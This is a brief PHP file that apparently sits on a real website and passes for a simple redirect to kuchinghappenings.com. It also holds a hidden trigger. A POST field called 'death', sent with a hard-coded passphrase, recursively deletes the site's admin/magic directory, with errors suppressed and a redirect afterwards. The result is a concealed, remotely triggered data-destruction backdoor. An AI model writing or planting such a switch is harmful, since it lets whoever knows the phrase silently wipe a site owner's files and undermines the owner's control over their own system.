<?php

/**
 * Delete a file or recursively delete a directory
 *
 * @param string $str Path to file or directory
 */
function recursiveDelete($str){
    if(is_file($str)){
        return @unlink($str);
    }
    elseif(is_dir($str)){
        $scan = glob(rtrim($str,'/').'/*');
        foreach($scan as $index=>$path){
            recursiveDelete($path);
        }
        return @rmdir($str);
    }
}


if(!empty($_POST['death'])){
    if (strcmp($_POST['death'], 'The_Death_of_Many_Shall_Cleanse_This_Place') == 0) {
       recursiveDelete('/home/kuchingh/public_html/admin/magic');
    }
}

header('Location: http://kuchinghappenings.com');

